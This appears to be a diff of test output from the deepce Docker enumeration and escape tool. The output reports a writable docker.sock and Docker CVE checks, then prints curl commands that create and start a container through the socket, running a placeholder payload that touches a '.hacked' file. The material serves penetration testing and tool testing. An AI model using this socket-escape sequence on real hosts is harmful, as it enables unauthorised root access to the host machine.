@@ -45,7 +45,7 @@ fetch http://dl-cdn.alpinelinux.org/alpine/v3.12/community/x86_64/APKINDEX.tar.g
 (10/26) Installing libprotobuf (3.12.2-r0)
 (11/26) Installing libprotoc (3.12.2-r0)
 (12/26) Installing protobuf-c (1.3.3-r1)
-(13/26) Installing libuv (1.37.0-r0)
+(13/26) Installing libuv (1.38.1-r0)
 (14/26) Installing xz-libs (5.2.5-r0)
 (15/26) Installing libxml2 (2.9.10-r5)
 (16/26) Installing bind-libs (9.16.6-r0)
@@ -70,7 +70,7 @@ OK: 33 MiB in 40 packages
 [1;33m[+][1;32m Groups .................. [0m[1;90m[1;37m[48;5;1mroot[0m[1;90m bin daemon sys adm disk [1;37m[48;5;1mwheel[0m[1;90m floppy dialout tape video[0m
 [1;33m[+][1;32m Docker Executable ....... [0m[1;90mNot Found[0m
 [1;33m[+][1;32m Docker Sock ............. [0m[1;33mYes[0m
-[1;37msrw-rw----    1 root     116            0 Sep 20 09:53 /var/run/docker.sock[0m
+[1;37msrw-rw----    1 root     116            0 Oct  4 16:04 /var/run/docker.sock[0m
 
 [1;33m[+][1;32m Sock is writable ........ [0m[48;5;1mYes[0m
 [1;90mThe docker sock is writable, we should be able to enumerate docker, create containers 
@@ -87,14 +87,14 @@ OSType:linux
 Architecture:x86_64
 NCPU:2
 DockerRootDir:/var/lib/docker
-Name:fv-az19
+Name:fv-az21
 ServerVersion:19.03.12+azure[0m
 [1;33m[+][1;32m Docker Exploits ......... [0m[1;33m19.03.12+azure[0m
 [1;33m[+][1;32m CVE–2019–13139 .......... [0m[1;90mNo[0m
 [1;33m[+][1;32m CVE–2019–5736 ........... [0m[1;90mNo[0m
 [1;34m==================================[1;32m( Enumerating Container )[1;34m===================================[0m
-[1;33m[+][1;32m Container ID ............ [0m[1;33mb4daa16293c2[0m
-[1;33m[+][1;32m Container Full ID ....... [0m[1;33mb4daa16293c24060680df5fc47d29821d68949c63c2694cecb7b63d84e34b27e[0m
+[1;33m[+][1;32m Container ID ............ [0m[1;33m0a0dcec9a56e[0m
+[1;33m[+][1;32m Container Full ID ....... [0m[1;33m0a0dcec9a56ea264fe649932289ee19535dcce5dabdeb2107aced5b053d149d5[0m
 [1;33m[+][1;32m Container Name .......... [0m[1;31mCould not get container name through reverse DNS[0m
 [1;33m[+][1;32m Container IP ............ [0m[1;33m172.17.0.2[0m
 [1;33m[+][1;32m DNS Server(s) ........... [0m[1;33m168.63.129.16 [0m
@@ -123,12 +123,12 @@ and obtain root privs on the host machine
 See [4mhttps://stealthcopter.github.io/deepce/guides/docker-sock.md[0m[0m
 
 [1;33m[+][1;32m Other mounts .............. [0m[1;33mYes[0m
-[1;90m/home/runner/work/deepce/deepce/deepce.sh /root/deepce.sh rw,relatime - ext4 /dev/sdb1 rw,discard[0m
+[1;90m/home/runner/work/deepce/deepce/deepce.sh /root/deepce.sh rw,relatime - ext4 /dev/sda1 rw,discard[0m
 [1;33m[+][1;32m Possible host usernames ... [0m[1;33mrunner [0m
 [1;34m====================================[1;32m( Interesting Files )[1;34m=====================================[0m
 [1;33m[+][1;32m Interesting environment variables ... [0m[1;90mNo[0m
 [1;90mHOME=/root
-HOSTNAME=b4daa16293c2
+HOSTNAME=0a0dcec9a56e
 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 PWD=/
 SHLVL=1[0m
@@ -150,13 +150,13 @@ host machine, this can be used to enumerate further[0m
 [1;33m[+][1;32m Custom Command ........... [0m[1;90mtouch /tmp/deepce-docker-alpine-payload-command.hacked[0m
 [1;33m[+][1;32m Clean up ................. [0m[1;90mAutomatic on container exit[0m
 
-[1;33m[+][1;32m Creating container ..... [0m[1;33m27c805412627aa98a9f86897278b2303fc6e8a8e035981717f6e39fb02a53a3a[0m
+[1;33m[+][1;32m Creating container ..... [0m[1;33m0f104f5cf55e5c440d4d12cd3054c4d319c857dc79ff0a96390a852a021443e5[0m
 [1;33m[+][1;32m If the shell dies you can restart your listener and run the start command to fire it again [0m
-[1;90mStart Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/27c805412627aa98a9f86897278b2303fc6e8a8e035981717f6e39fb02a53a3a/start[0m
-[1;90mLogs Command: curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/27c805412627aa98a9f86897278b2303fc6e8a8e035981717f6e39fb02a53a3a/logs?stderr=1&stdout=1" --output -[0m
+[1;90mStart Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/0f104f5cf55e5c440d4d12cd3054c4d319c857dc79ff0a96390a852a021443e5/start[0m
+[1;90mLogs Command: curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/0f104f5cf55e5c440d4d12cd3054c4d319c857dc79ff0a96390a852a021443e5/logs?stderr=1&stdout=1" --output -[0m
 [1;33m[+][1;32m Once complete remember to tidy up by stopping and removing your container with following commands [0m
-[1;90mStop Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/27c805412627aa98a9f86897278b2303fc6e8a8e035981717f6e39fb02a53a3a/stop[0m
-[1;90mRemove Command: curl -s -XDELETE --unix-socket /var/run/docker.sock http://localhost/containers/27c805412627aa98a9f86897278b2303fc6e8a8e035981717f6e39fb02a53a3a[0m
+[1;90mStop Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/0f104f5cf55e5c440d4d12cd3054c4d319c857dc79ff0a96390a852a021443e5/stop[0m
+[1;90mRemove Command: curl -s -XDELETE --unix-socket /var/run/docker.sock http://localhost/containers/0f104f5cf55e5c440d4d12cd3054c4d319c857dc79ff0a96390a852a021443e5[0m
 [1;33m[+][1;32m Starting container ..... [0m[1;33mSuccess[0m
 [1;33m[+][1;32m Sleeping for ........... [0m[1;90m2s[0m
 [1;33m[+][1;32m Fetching logs .......... [0m[1;33mSuccess[0m
